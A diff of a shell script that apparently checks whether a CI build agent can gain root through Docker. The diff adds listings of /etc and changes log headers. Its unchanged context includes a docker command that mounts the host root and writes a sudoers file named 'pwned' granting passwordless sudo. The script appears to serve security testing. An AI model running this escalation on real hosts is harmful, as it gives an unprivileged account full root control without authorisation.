@@ -14,7 +14,11 @@ docker run --userns=host -v /:/chroot -w /chroot alpine:latest rm file-created-a
 echo +++ Checking /
 ls -lA /
 
-echo ~~~ Testing sudo
+echo +++ Checking /etc
+ls -lA /etc
+ls -lA /etc/sudoers.d
+
+echo +++ Testing sudo
 if sudo --non-interactive whoami; then
   echo "sudo succeeded"
 else
@@ -24,7 +28,7 @@ fi
 echo --- Modifying sudoers
 docker run --userns=host -v /:/chroot -w /chroot alpine:latest echo "'buildkite-agent ALL=(ALL) NOPASSWD: ALL'" > /chroot/etc/sudoers.d/pwned
 
-echo ~~~ Testing sudo
+echo +++ Testing sudo
 if sudo --non-interactive whoami; then
   echo "sudo succeeded"
 else
